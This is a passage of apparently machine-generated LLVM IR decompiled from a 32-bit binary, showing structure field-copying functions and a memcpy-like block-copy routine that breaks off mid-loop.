  %v1_407680 = add i32 %v0_407680, 44
  %v2_407680 = inttoptr i32 %v1_407680 to i32*
  store i32 0, i32* %v2_407680, align 4
  %v0_407684 = load i32, i32* %v0.global-to-local, align 4
  %v1_407684 = load i32, i32* %s0.global-to-local, align 4
  %v2_407684 = add i32 %v1_407684, 40
  %v3_407684 = inttoptr i32 %v2_407684 to i32*
  store i32 %v0_407684, i32* %v3_407684, align 4
  %v0_407688 = load i32, i32* %s1.global-to-local, align 4
  %v1_407688 = add i32 %v0_407688, 56
  %v2_407688 = inttoptr i32 %v1_407688 to i32*
  %v3_407688 = load i32, i32* %v2_407688, align 4
  store i32 %v3_407688, i32* %v0.global-to-local, align 4
  %v1_40768c = add i32 %v0_407688, 60
  %v2_40768c = inttoptr i32 %v1_40768c to i32*
  %v3_40768c = load i32, i32* %v2_40768c, align 4
  store i32 %v3_40768c, i32* %v1.global-to-local, align 4
  %v1_407690 = load i32, i32* %s0.global-to-local, align 4
  %v2_407690 = add i32 %v1_407690, 56
  %v3_407690 = inttoptr i32 %v2_407690 to i32*
  store i32 %v3_407688, i32* %v3_407690, align 4
  %v0_407694 = load i32, i32* %v1.global-to-local, align 4
  %v1_407694 = load i32, i32* %s0.global-to-local, align 4
  %v2_407694 = add i32 %v1_407694, 60
  %v3_407694 = inttoptr i32 %v2_407694 to i32*
  store i32 %v0_407694, i32* %v3_407694, align 4
  %v0_407698 = load i32, i32* %s1.global-to-local, align 4
  %v1_407698 = add i32 %v0_407698, 88
  %v2_407698 = inttoptr i32 %v1_407698 to i32*
  %v3_407698 = load i32, i32* %v2_407698, align 4
  store i32 %v3_407698, i32* %v0.global-to-local, align 4
  %v1_4076a0 = load i32, i32* %s0.global-to-local, align 4
  %v2_4076a0 = add i32 %v1_4076a0, 88
  %v3_4076a0 = inttoptr i32 %v2_4076a0 to i32*
  store i32 %v3_407698, i32* %v3_4076a0, align 4
  %v0_4076a4 = load i32, i32* %s1.global-to-local, align 4
  %v1_4076a4 = add i32 %v0_4076a4, 96
  %v2_4076a4 = inttoptr i32 %v1_4076a4 to i32*
  %v3_4076a4 = load i32, i32* %v2_4076a4, align 4
  store i32 %v3_4076a4, i32* %v0.global-to-local, align 4
  %v1_4076a8 = add i32 %v0_4076a4, 100
  %v2_4076a8 = inttoptr i32 %v1_4076a8 to i32*
  %v3_4076a8 = load i32, i32* %v2_4076a8, align 4
  store i32 %v3_4076a8, i32* %v1.global-to-local, align 4
  %v1_4076ac = load i32, i32* %s0.global-to-local, align 4
  %v2_4076ac = add i32 %v1_4076ac, 96
  %v3_4076ac = inttoptr i32 %v2_4076ac to i32*
  store i32 %v3_4076a4, i32* %v3_4076ac, align 4
  %v0_4076b0 = load i32, i32* %v1.global-to-local, align 4
  %v1_4076b0 = load i32, i32* %s0.global-to-local, align 4
  %v2_4076b0 = add i32 %v1_4076b0, 100
  %v3_4076b0 = inttoptr i32 %v2_4076b0 to i32*
  store i32 %v0_4076b0, i32* %v3_4076b0, align 4
  %v0_4076b4 = load i32, i32* %s1.global-to-local, align 4
  %v1_4076b4 = add i32 %v0_4076b4, 64
  %v2_4076b4 = inttoptr i32 %v1_4076b4 to i32*
  %v3_4076b4 = load i32, i32* %v2_4076b4, align 4
  store i32 %v3_4076b4, i32* %v0.global-to-local, align 4
  %v1_4076bc = load i32, i32* %s0.global-to-local, align 4
  %v2_4076bc = add i32 %v1_4076bc, 64
  %v3_4076bc = inttoptr i32 %v2_4076bc to i32*
  store i32 %v3_4076b4, i32* %v3_4076bc, align 4
  %v0_4076c0 = load i32, i32* %s1.global-to-local, align 4
  %v1_4076c0 = add i32 %v0_4076c0, 72
  %v2_4076c0 = inttoptr i32 %v1_4076c0 to i32*
  %v3_4076c0 = load i32, i32* %v2_4076c0, align 4
  store i32 %v3_4076c0, i32* %v0.global-to-local, align 4
  %v1_4076c8 = load i32, i32* %s0.global-to-local, align 4
  %v2_4076c8 = add i32 %v1_4076c8, 72
  %v3_4076c8 = inttoptr i32 %v2_4076c8 to i32*
  store i32 %v3_4076c0, i32* %v3_4076c8, align 4
  %v0_4076cc = load i32, i32* %s1.global-to-local, align 4
  %v1_4076cc = add i32 %v0_4076cc, 80
  %v2_4076cc = inttoptr i32 %v1_4076cc to i32*
  %v3_4076cc = load i32, i32* %v2_4076cc, align 4
  store i32 %v3_4076cc, i32* %v0.global-to-local, align 4
  %v1_4076d4 = load i32, i32* %s0.global-to-local, align 4
  %v2_4076d4 = add i32 %v1_4076d4, 80
  %v3_4076d4 = inttoptr i32 %v2_4076d4 to i32*
  store i32 %v3_4076cc, i32* %v3_4076d4, align 4
  %v0_4076d8 = load i32, i32* %s1.global-to-local, align 4
  %v1_4076d8 = add i32 %v0_4076d8, 68
  %v2_4076d8 = inttoptr i32 %v1_4076d8 to i32*
  %v3_4076d8 = load i32, i32* %v2_4076d8, align 4
  store i32 %v3_4076d8, i32* %v0.global-to-local, align 4
  %v1_4076e0 = load i32, i32* %s0.global-to-local, align 4
  %v2_4076e0 = add i32 %v1_4076e0, 68
  %v3_4076e0 = inttoptr i32 %v2_4076e0 to i32*
  store i32 %v3_4076d8, i32* %v3_4076e0, align 4
  %v0_4076e4 = load i32, i32* %s1.global-to-local, align 4
  %v1_4076e4 = add i32 %v0_4076e4, 76
  %v2_4076e4 = inttoptr i32 %v1_4076e4 to i32*
  %v3_4076e4 = load i32, i32* %v2_4076e4, align 4
  store i32 %v3_4076e4, i32* %v0.global-to-local, align 4
  %v1_4076ec = load i32, i32* %s0.global-to-local, align 4
  %v2_4076ec = add i32 %v1_4076ec, 76
  %v3_4076ec = inttoptr i32 %v2_4076ec to i32*
  store i32 %v3_4076e4, i32* %v3_4076ec, align 4
  %v0_4076f0 = load i32, i32* %s1.global-to-local, align 4
  %v1_4076f0 = add i32 %v0_4076f0, 84
  %v2_4076f0 = inttoptr i32 %v1_4076f0 to i32*
  %v3_4076f0 = load i32, i32* %v2_4076f0, align 4
  store i32 %v3_4076f0, i32* %v0.global-to-local, align 4
  %v1_4076f8 = load i32, i32* %s0.global-to-local, align 4
  %v2_4076f8 = add i32 %v1_4076f8, 84
  %v3_4076f8 = inttoptr i32 %v2_4076f8 to i32*
  store i32 %v3_4076f0, i32* %v3_4076f8, align 4
  ret i32 %v3_4076f0

; uselistorder directives
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 20, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32 160, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_407710(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407710:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %s0.global-to-local, align 4
  store i32 %tmp, i32* %s1.global-to-local, align 4
  %v4_407744 = inttoptr i32 %arg2 to i32*
  %v5_407744 = call i32 @function_405660(i32* %v4_407744, i32 0, i32 152)
  store i32 %v5_407744, i32* %v0.global-to-local, align 4
  %v2_40774c = load i32, i32* %arg1, align 4
  store i32 %v2_40774c, i32* %v0.global-to-local, align 4
  %v0_407754 = load i32, i32* %s0.global-to-local, align 4
  %v1_407754 = add i32 %v0_407754, 4
  %v2_407754 = inttoptr i32 %v1_407754 to i32*
  store i32 0, i32* %v2_407754, align 4
  %v0_407758 = load i32, i32* %v0.global-to-local, align 4
  %v1_407758 = load i32, i32* %s0.global-to-local, align 4
  %v2_407758 = inttoptr i32 %v1_407758 to i32*
  store i32 %v0_407758, i32* %v2_407758, align 4
  %v0_40775c = load i32, i32* %s1.global-to-local, align 4
  %v1_40775c = add i32 %v0_40775c, 16
  %v2_40775c = inttoptr i32 %v1_40775c to i32*
  %v3_40775c = load i32, i32* %v2_40775c, align 4
  store i32 %v3_40775c, i32* %v0.global-to-local, align 4
  %v1_407764 = load i32, i32* %s0.global-to-local, align 4
  %v2_407764 = add i32 %v1_407764, 16
  %v3_407764 = inttoptr i32 %v2_407764 to i32*
  store i32 %v3_40775c, i32* %v3_407764, align 4
  %v0_407768 = load i32, i32* %s1.global-to-local, align 4
  %v1_407768 = add i32 %v0_407768, 20
  %v2_407768 = inttoptr i32 %v1_407768 to i32*
  %v3_407768 = load i32, i32* %v2_407768, align 4
  store i32 %v3_407768, i32* %v0.global-to-local, align 4
  %v1_407770 = load i32, i32* %s0.global-to-local, align 4
  %v2_407770 = add i32 %v1_407770, 20
  %v3_407770 = inttoptr i32 %v2_407770 to i32*
  store i32 %v3_407768, i32* %v3_407770, align 4
  %v0_407774 = load i32, i32* %s1.global-to-local, align 4
  %v1_407774 = add i32 %v0_407774, 24
  %v2_407774 = inttoptr i32 %v1_407774 to i32*
  %v3_407774 = load i32, i32* %v2_407774, align 4
  store i32 %v3_407774, i32* %v0.global-to-local, align 4
  %v1_40777c = load i32, i32* %s0.global-to-local, align 4
  %v2_40777c = add i32 %v1_40777c, 24
  %v3_40777c = inttoptr i32 %v2_40777c to i32*
  store i32 %v3_407774, i32* %v3_40777c, align 4
  %v0_407780 = load i32, i32* %s1.global-to-local, align 4
  %v1_407780 = add i32 %v0_407780, 28
  %v2_407780 = inttoptr i32 %v1_407780 to i32*
  %v3_407780 = load i32, i32* %v2_407780, align 4
  store i32 %v3_407780, i32* %v0.global-to-local, align 4
  %v1_407788 = load i32, i32* %s0.global-to-local, align 4
  %v2_407788 = add i32 %v1_407788, 28
  %v3_407788 = inttoptr i32 %v2_407788 to i32*
  store i32 %v3_407780, i32* %v3_407788, align 4
  %v0_40778c = load i32, i32* %s1.global-to-local, align 4
  %v1_40778c = add i32 %v0_40778c, 32
  %v2_40778c = inttoptr i32 %v1_40778c to i32*
  %v3_40778c = load i32, i32* %v2_40778c, align 4
  store i32 %v3_40778c, i32* %v0.global-to-local, align 4
  %v1_407794 = load i32, i32* %s0.global-to-local, align 4
  %v2_407794 = add i32 %v1_407794, 32
  %v3_407794 = inttoptr i32 %v2_407794 to i32*
  store i32 %v3_40778c, i32* %v3_407794, align 4
  %v0_407798 = load i32, i32* %s1.global-to-local, align 4
  %v1_407798 = add i32 %v0_407798, 36
  %v2_407798 = inttoptr i32 %v1_407798 to i32*
  %v3_407798 = load i32, i32* %v2_407798, align 4
  store i32 %v3_407798, i32* %v0.global-to-local, align 4
  %v0_40779c = load i32, i32* %s0.global-to-local, align 4
  %v1_40779c = add i32 %v0_40779c, 44
  %v2_40779c = inttoptr i32 %v1_40779c to i32*
  store i32 0, i32* %v2_40779c, align 4
  %v0_4077a0 = load i32, i32* %v0.global-to-local, align 4
  %v1_4077a0 = load i32, i32* %s0.global-to-local, align 4
  %v2_4077a0 = add i32 %v1_4077a0, 40
  %v3_4077a0 = inttoptr i32 %v2_4077a0 to i32*
  store i32 %v0_4077a0, i32* %v3_4077a0, align 4
  %v0_4077a4 = load i32, i32* %s1.global-to-local, align 4
  %v1_4077a4 = add i32 %v0_4077a4, 48
  %v2_4077a4 = inttoptr i32 %v1_4077a4 to i32*
  %v3_4077a4 = load i32, i32* %v2_4077a4, align 4
  store i32 %v3_4077a4, i32* %v0.global-to-local, align 4
  %v1_4077ac = load i32, i32* %s0.global-to-local, align 4
  %v2_4077ac = add i32 %v1_4077ac, 52
  %v3_4077ac = inttoptr i32 %v2_4077ac to i32*
  store i32 %v3_4077a4, i32* %v3_4077ac, align 4
  %v0_4077b0 = load i32, i32* %s1.global-to-local, align 4
  %v1_4077b0 = add i32 %v0_4077b0, 80
  %v2_4077b0 = inttoptr i32 %v1_4077b0 to i32*
  %v3_4077b0 = load i32, i32* %v2_4077b0, align 4
  store i32 %v3_4077b0, i32* %v0.global-to-local, align 4
  %v1_4077b8 = load i32, i32* %s0.global-to-local, align 4
  %v2_4077b8 = add i32 %v1_4077b8, 84
  %v3_4077b8 = inttoptr i32 %v2_4077b8 to i32*
  store i32 %v3_4077b0, i32* %v3_4077b8, align 4
  %v0_4077bc = load i32, i32* %s1.global-to-local, align 4
  %v1_4077bc = add i32 %v0_4077bc, 84
  %v2_4077bc = inttoptr i32 %v1_4077bc to i32*
  %v3_4077bc = load i32, i32* %v2_4077bc, align 4
  store i32 %v3_4077bc, i32* %v0.global-to-local, align 4
  %v1_4077c4 = load i32, i32* %s0.global-to-local, align 4
  %v2_4077c4 = add i32 %v1_4077c4, 88
  %v3_4077c4 = inttoptr i32 %v2_4077c4 to i32*
  store i32 %v3_4077bc, i32* %v3_4077c4, align 4
  %v0_4077c8 = load i32, i32* %s1.global-to-local, align 4
  %v1_4077c8 = add i32 %v0_4077c8, 56
  %v2_4077c8 = inttoptr i32 %v1_4077c8 to i32*
  %v3_4077c8 = load i32, i32* %v2_4077c8, align 4
  store i32 %v3_4077c8, i32* %v0.global-to-local, align 4
  %v1_4077d0 = load i32, i32* %s0.global-to-local, align 4
  %v2_4077d0 = add i32 %v1_4077d0, 60
  %v3_4077d0 = inttoptr i32 %v2_4077d0 to i32*
  store i32 %v3_4077c8, i32* %v3_4077d0, align 4
  %v0_4077d4 = load i32, i32* %s1.global-to-local, align 4
  %v1_4077d4 = add i32 %v0_4077d4, 64
  %v2_4077d4 = inttoptr i32 %v1_4077d4 to i32*
  %v3_4077d4 = load i32, i32* %v2_4077d4, align 4
  store i32 %v3_4077d4, i32* %v0.global-to-local, align 4
  %v1_4077dc = load i32, i32* %s0.global-to-local, align 4
  %v2_4077dc = add i32 %v1_4077dc, 68
  %v3_4077dc = inttoptr i32 %v2_4077dc to i32*
  store i32 %v3_4077d4, i32* %v3_4077dc, align 4
  %v0_4077e0 = load i32, i32* %s1.global-to-local, align 4
  %v1_4077e0 = add i32 %v0_4077e0, 72
  %v2_4077e0 = inttoptr i32 %v1_4077e0 to i32*
  %v3_4077e0 = load i32, i32* %v2_4077e0, align 4
  store i32 %v3_4077e0, i32* %v0.global-to-local, align 4
  %v1_4077e8 = load i32, i32* %s0.global-to-local, align 4
  %v2_4077e8 = add i32 %v1_4077e8, 76
  %v3_4077e8 = inttoptr i32 %v2_4077e8 to i32*
  store i32 %v3_4077e0, i32* %v3_4077e8, align 4
  %v0_4077ec = load i32, i32* %s1.global-to-local, align 4
  %v1_4077ec = add i32 %v0_4077ec, 60
  %v2_4077ec = inttoptr i32 %v1_4077ec to i32*
  %v3_4077ec = load i32, i32* %v2_4077ec, align 4
  store i32 %v3_4077ec, i32* %v0.global-to-local, align 4
  %v1_4077f4 = load i32, i32* %s0.global-to-local, align 4
  %v2_4077f4 = add i32 %v1_4077f4, 64
  %v3_4077f4 = inttoptr i32 %v2_4077f4 to i32*
  store i32 %v3_4077ec, i32* %v3_4077f4, align 4
  %v0_4077f8 = load i32, i32* %s1.global-to-local, align 4
  %v1_4077f8 = add i32 %v0_4077f8, 68
  %v2_4077f8 = inttoptr i32 %v1_4077f8 to i32*
  %v3_4077f8 = load i32, i32* %v2_4077f8, align 4
  store i32 %v3_4077f8, i32* %v0.global-to-local, align 4
  %v1_407800 = load i32, i32* %s0.global-to-local, align 4
  %v2_407800 = add i32 %v1_407800, 72
  %v3_407800 = inttoptr i32 %v2_407800 to i32*
  store i32 %v3_4077f8, i32* %v3_407800, align 4
  %v0_407804 = load i32, i32* %s1.global-to-local, align 4
  %v1_407804 = add i32 %v0_407804, 76
  %v2_407804 = inttoptr i32 %v1_407804 to i32*
  %v3_407804 = load i32, i32* %v2_407804, align 4
  store i32 %v3_407804, i32* %v0.global-to-local, align 4
  %v1_40780c = load i32, i32* %s0.global-to-local, align 4
  %v2_40780c = add i32 %v1_40780c, 80
  %v3_40780c = inttoptr i32 %v2_40780c to i32*
  store i32 %v3_407804, i32* %v3_40780c, align 4
  ret i32 %v3_407804

; uselistorder directives
  uselistorder i32* %s1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 14, 9, 10, 11, 12, 13, 15 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 10, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 64, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 48, { 1, 0, 2, 3 }
  uselistorder i32 40, { 3, 4, 5, 6, 1, 7, 2, 8, 0, 9 }
  uselistorder i32 (i32*, i32, i32)* @function_405660, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_407830(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407830:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %t2.global-to-local = alloca i32, align 4
  %t3.global-to-local = alloca i32, align 4
  %t4.global-to-local = alloca i32, align 4
  %t5.global-to-local = alloca i32, align 4
  %t6.global-to-local = alloca i32, align 4
  %t7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %a2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %a1.global-to-local, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %v0_407830 = load i32, i32* %a2.global-to-local, align 4
  %v1_407830 = icmp slt i32 %v0_407830, 8
  %v2_407830 = zext i1 %v1_407830 to i32
  store i32 %v2_407830, i32* %t0.global-to-local, align 4
  %v2_407834 = load i32, i32* %a0.global-to-local, align 4
  br i1 %v1_407830, label %dec_label_pc_4078f0, label %dec_label_pc_407838

dec_label_pc_407838:                              ; preds = %dec_label_pc_407830
  %v0_40783c = load i32, i32* %a1.global-to-local, align 4
  %v2_40783c = xor i32 %v0_40783c, %v2_407834
  %v1_407840 = urem i32 %v2_40783c, 4
  store i32 %v1_407840, i32* %t0.global-to-local, align 4
  %v1_407844 = icmp eq i32 %v1_407840, 0
  %v3_407844 = sub i32 0, %v0_40783c
  store i32 %v3_407844, i32* %t1.global-to-local, align 4
  br i1 %v1_407844, label %dec_label_pc_407848, label %dec_label_pc_407914

dec_label_pc_407848:                              ; preds = %dec_label_pc_407838
  %v1_40784c = urem i32 %v3_407844, 4
  store i32 %v1_40784c, i32* %t1.global-to-local, align 4
  %v1_407850 = icmp eq i32 %v1_40784c, 0
  %v4_407850 = sub i32 %v0_407830, %v1_40784c
  store i32 %v4_407850, i32* %a2.global-to-local, align 4
  br i1 %v1_407850, label %dec_label_pc_407868, label %dec_label_pc_407854

dec_label_pc_407854:                              ; preds = %dec_label_pc_407848
  %v2_40785c = add i32 %v1_40784c, %v0_40783c
  store i32 %v2_40785c, i32* %a1.global-to-local, align 4
  %v2_407864 = add i32 %v1_40784c, %v2_407834
  store i32 %v2_407864, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407868

dec_label_pc_407868:                              ; preds = %dec_label_pc_407848, %dec_label_pc_407854
  %v0_40789c10 = phi i32 [ %v2_407834, %dec_label_pc_407848 ], [ %v2_407864, %dec_label_pc_407854 ]
  %v1_407874 = phi i32 [ %v0_40783c, %dec_label_pc_407848 ], [ %v2_40785c, %dec_label_pc_407854 ]
  %v1_407868 = urem i32 %v4_407850, 32
  store i32 %v1_407868, i32* %t0.global-to-local, align 4
  %v2_40786c = icmp eq i32 %v4_407850, %v1_407868
  %v5_40786c = sub i32 %v4_407850, %v1_407868
  store i32 %v5_40786c, i32* %a3.global-to-local, align 4
  br i1 %v2_40786c, label %dec_label_pc_4078c8, label %dec_label_pc_407870

dec_label_pc_407870:                              ; preds = %dec_label_pc_407868
  %v2_407874 = add i32 %v1_407874, %v5_40786c
  store i32 %v2_407874, i32* %a3.global-to-local, align 4
  store i32 %v1_407868, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_40787c

dec_label_pc_40787c:                              ; preds = %dec_label_pc_40787c.dec_label_pc_40787c_crit_edge, %dec_label_pc_407870
  %v0_40789c = phi i32 [ %v0_40789c.pre, %dec_label_pc_40787c.dec_label_pc_40787c_crit_edge ], [ %v0_40789c10, %dec_label_pc_407870 ]
  %v0_4078a0 = phi i32 [ %v0_40787c.pre, %dec_label_pc_40787c.dec_label_pc_40787c_crit_edge ], [ %v1_407874, %dec_label_pc_407870 ]
  %v1_40787c = inttoptr i32 %v0_4078a0 to i32*
  %v2_40787c = load i32, i32* %v1_40787c, align 4
  store i32 %v2_40787c, i32* %t0.global-to-local, align 4
  %v1_407880 = add i32 %v0_4078a0, 4
  %v2_407880 = inttoptr i32 %v1_407880 to i32*
  %v3_407880 = load i32, i32* %v2_407880, align 4
  store i32 %v3_407880, i32* %t1.global-to-local, align 4
  %v1_407884 = add i32 %v0_4078a0, 8
  %v2_407884 = inttoptr i32 %v1_407884 to i32*
  %v3_407884 = load i32, i32* %v2_407884, align 4
  store i32 %v3_407884, i32* %t2.global-to-local, align 4
  %v1_407888 = add i32 %v0_4078a0, 12
  %v2_407888 = inttoptr i32 %v1_407888 to i32*
  %v3_407888 = load i32, i32* %v2_407888, align 4
  store i32 %v3_407888, i32* %t3.global-to-local, align 4
  %v1_40788c = add i32 %v0_4078a0, 16
  %v2_40788c = inttoptr i32 %v1_40788c to i32*
  %v3_40788c = load i32, i32* %v2_40788c, align 4
  store i32 %v3_40788c, i32* %t4.global-to-local, align 4
  %v1_407890 = add i32 %v0_4078a0, 20
  %v2_407890 = inttoptr i32 %v1_407890 to i32*
  %v3_407890 = load i32, i32* %v2_407890, align 4
  store i32 %v3_407890, i32* %t5.global-to-local, align 4
  %v1_407894 = add i32 %v0_4078a0, 24
  %v2_407894 = inttoptr i32 %v1_407894 to i32*
  %v3_407894 = load i32, i32* %v2_407894, align 4
  store i32 %v3_407894, i32* %t6.global-to-local, align 4
  %v1_407898 = add i32 %v0_4078a0, 28
  %v2_407898 = inttoptr i32 %v1_407898 to i32*
  %v3_407898 = load i32, i32* %v2_407898, align 4
  store i32 %v3_407898, i32* %t7.global-to-local, align 4
  %v1_40789c = add i32 %v0_40789c, 32
  store i32 %v1_40789c, i32* %a0.global-to-local, align 4
  %v1_4078a0 = add i32 %v0_4078a0, 32
  store i32 %v1_4078a0, i32* %a1.global-to-local, align 4
  %v3_4078a4 = inttoptr i32 %v0_40789c to i32*
  store i32 %v2_40787c, i32* %v3_4078a4, align 4
  %v0_4078a8 = load i32, i32* %t1.global-to-local, align 4
  %v1_4078a8 = load i32, i32* %a0.global-to-local, align 4
  %v2_4078a8 = add i32 %v1_4078a8, -28
  %v3_4078a8 = inttoptr i32 %v2_4078a8 to i32*
  store i32 %v0_4078a8, i32* %v3_4078a8, align 4
  %v0_4078ac = load i32, i32* %t2.global-to-local, align 4
  %v1_4078ac = load i32, i32* %a0.global-to-local, align 4
  %v2_4078ac = add i32 %v1_4078ac, -24
  %v3_4078ac = inttoptr i32 %v2_4078ac to i32*
  store i32 %v0_4078ac, i32* %v3_4078ac, align 4
  %v0_4078b0 = load i32, i32* %t3.global-to-local, align 4
  %v1_4078b0 = load i32, i32* %a0.global-to-local, align 4
  %v2_4078b0 = add i32 %v1_4078b0, -20
  %v3_4078b0 = inttoptr i32 %v2_4078b0 to i32*
  store i32 %v0_4078b0, i32* %v3_4078b0, align 4
  %v0_4078b4 = load i32, i32* %t4.global-to-local, align 4
  %v1_4078b4 = load i32, i32* %a0.global-to-local, align 4
  %v2_4078b4 = add i32 %v1_4078b4, -16
  %v3_4078b4 = inttoptr i32 %v2_4078b4 to i32*
  store i32 %v0_4078b4, i32* %v3_4078b4, align 4
  %v0_4078b8 = load i32, i32* %t5.global-to-local, align 4
  %v1_4078b8 = load i32, i32* %a0.global-to-local, align 4
  %v2_4078b8 = add i32 %v1_4078b8, -12
  %v3_4078b8 = inttoptr i32 %v2_4078b8 to i32*
  store i32 %v0_4078b8, i32* %v3_4078b8, align 4
  %v0_4078bc = load i32, i32* %t6.global-to-local, align 4
  %v1_4078bc = load i32, i32* %a0.global-to-local, align 4
  %v2_4078bc = add i32 %v1_4078bc, -8
  %v3_4078bc = inttoptr i32 %v2_4078bc to i32*
  store i32 %v0_4078bc, i32* %v3_4078bc, align 4
  %v0_4078c0 = load i32, i32* %a1.global-to-local, align 4
  %v1_4078c0 = load i32, i32* %a3.global-to-local, align 4
  %v2_4078c0 = icmp eq i32 %v0_4078c0, %v1_4078c0
  %v3_4078c0 = load i32, i32* %t7.global-to-local, align 4
  %v4_4078c0 = load i32, i32* %a0.global-to-local, align 4
  %v5_4078c0 = add i32 %v4_4078c0, -4
  %v6_4078c0 = inttoptr i32 %v5_4078c0 to i32*
  store i32 %v3_4078c0, i32* %v6_4078c0, align 4
  br i1 %v2_4078c0, label %dec_label_pc_4078c8.loopexit, label %dec_label_pc_40787c.dec_label_pc_40787c_crit_edge

dec_label_pc_40787c.dec_label_pc_40787c_crit_edge: ; preds = %dec_label_pc_40787c
  %v0_40787c.pre = load i32, i32* %a1.global-to-local, align 4
  %v0_40789c.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_40787c

dec_label_pc_4078c8.loopexit:                     ; preds = %dec_label_pc_40787c
  %v0_4078c8.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4078c8

dec_label_pc_4078c8:                              ; preds = %dec_label_pc_4078c8.loopexit, %dec_label_pc_407868
  %v0_4078c8 = phi i32 [ %v0_4078c8.pre, %dec_label_pc_4078c8.loopexit ], [ %v4_407850, %dec_label_pc_407868 ]
  %v1_4078c8 = urem i32 %v0_4078c8, 4
  store i32 %v1_4078c8, i32* %t0.global-to-local, align 4
  %v2_4078cc = icmp eq i32 %v0_4078c8, %v1_4078c8
  %v5_4078cc = sub i32 %v0_4078c8, %v1_4078c8
  store i32 %v5_4078cc, i32* %a3.global-to-local, align 4
  br i1 %v2_4078cc, label %dec_label_pc_4078f0, label %dec_label_pc_4078d0

dec_label_pc_4078d0:                              ; preds = %dec_label_pc_4078c8
  %v1_4078d4 = load i32, i32* %a1.global-to-local, align 4
  %v2_4078d4 = add i32 %v1_4078d4, %v5_4078cc
  store i32 %v2_4078d4, i32* %a3.global-to-local, align 4
  store i32 %v1_4078c8, i32* %a2.global-to-local, align 4
  %v1_4078dc30 = inttoptr i32 %v1_4078d4 to i32*
  %v2_4078dc31 = load i32, i32* %v1_4078dc30, align 4
  store i32 %v2_4078dc31, i32* %t0.global-to-local, align 4
  %v0_4078e032 = load i32, i32* %a0.global-to-local, align 4
  %v1_4078e033 = add i32 %v0_4078e032, 4
  store i32 %v1_4078e033, i32* %a0.global-to-local, align 4
  %v1_4078e434 = add i32 %v1_4078d4, 4
  store i32 %v1_4078e434, i32* %a1.global-to-local, align 4
  %v2_4078e835 = icmp eq i32 %v1_4078e434, %v2_4078d4
  %v6_4078e836 = inttoptr i32 %v0_4078e032 to i32*
  store i32 %v2_4078dc31, i32* %v6_4078e836, align 4
  br i1 %v2_4078e835, label %dec_label_pc_4078f0.loopexit, label %dec_label_pc_4078dc.dec_label_pc_4078dc_crit_edge

dec_label_pc_4078dc.dec_label_pc_4078dc_crit_edge: ; preds = %dec_label_pc_4078d0, %dec_label_pc_4078dc.dec_label_pc_4078dc_crit_edge
  %v0_4078dc.pre = load i32, i32* %a1.global-to-local, align 4
  %v1_4078e8.pre = load i32, i32* %a3.global-to-local, align 4
  %v1_4078dc = inttoptr i32 %v0_4078dc.pre to i32*
  %v2_4078dc = load i32, i32* %v1_4078dc, align 4
  store i32 %v2_4078dc, i32* %t0.global-to-local, align 4
  %v0_4078e0 = load i32, i32* %a0.global-to-local, align 4
  %v1_4078e0 = add i32 %v0_4078e0, 4
  store i32 %v1_4078e0, i32* %a0.global-to-local, align 4
  %v1_4078e4 = add i32 %v0_4078dc.pre, 4
  store i32 %v1_4078e4, i32* %a1.global-to-local, align 4
  %v2_4078e8 = icmp eq i32 %v1_4078e4, %v1_4078e8.pre
  %v6_4078e8 = inttoptr i32 %v0_4078e0 to i32*
  store i32 %v2_4078dc, i32* %v6_4078e8, align 4
  br i1 %v2_4078e8, label %dec_label_pc_4078f0.loopexit, label %dec_label_pc_4078dc.dec_label_pc_4078dc_crit_edge

dec_label_pc_4078f0.loopexit:                     ; preds = %dec_label_pc_4078dc.dec_label_pc_4078dc_crit_edge, %dec_label_pc_4078d0
  %v0_4078f0.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4078f0

dec_label_pc_4078f0:                              ; preds = %dec_label_pc_4078f0.loopexit, %dec_label_pc_4078c8, %dec_label_pc_407830
  %v0_4078f0 = phi i32 [ %v0_4078f0.pre, %dec_label_pc_4078f0.loopexit ], [ %v0_4078c8, %dec_label_pc_4078c8 ], [ %v0_407830, %dec_label_pc_407830 ]
  %v1_4078f0 = icmp slt i32 %v0_4078f0, 1
  %v3_4078f0 = load i32, i32* %a1.global-to-local, align 4
  %v4_4078f0 = add i32 %v3_4078f0, %v0_4078f0
  store i32 %v4_4078f0, i32* @a3, align 4
  br i1 %v1_4078f0, label %dec_label_pc_40790c, label %dec_label_pc_4078f8.preheader

dec_label_pc_4078f8.preheader:                    ; preds = %dec_label_pc_4078f0
  %v1_4078f822 = inttoptr i32 %v3_4078f0 to i8*
  %v2_4078f823 = load i8, i8* %v1_4078f822, align 1
  %v3_4078f824 = sext i8 %v2_4078f823 to i32
  store i32 %v3_4078f824, i32* %t0.global-to-local, align 4
  %v0_4078fc25 = load i32, i32* %a0.global-to-local, align 4
  %v1_4078fc26 = add i32 %v0_4078fc25, 1
  store i32 %v1_4078fc26, i32* %a0.global-to-local, align 4
  %v1_40790027 = add i32 %v3_4078f0, 1
  store i32 %v1_40790027, i32* %a1.global-to-local, align 4
  %v2_40790428 = icmp eq i32 %v1_40790027, %v4_4078f0
